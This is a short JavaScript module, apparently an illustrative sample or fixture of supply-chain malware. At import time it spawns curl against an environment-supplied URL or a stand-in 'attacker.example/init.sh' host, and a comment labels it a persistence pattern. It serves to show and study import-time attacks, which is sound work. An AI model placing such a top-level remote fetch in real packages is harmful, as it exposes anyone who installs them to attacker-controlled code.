import { spawn } from 'child_process';

// Persistence pattern: spawn at module top-level executes on every
// `import` of this module — no operator action required. Canonical
// supply-chain malware shape.
spawn('curl', ['-fsSL', process.env.PAYLOAD_URL ?? 'https://attacker.example/init.sh']);

export const noop = () => null;
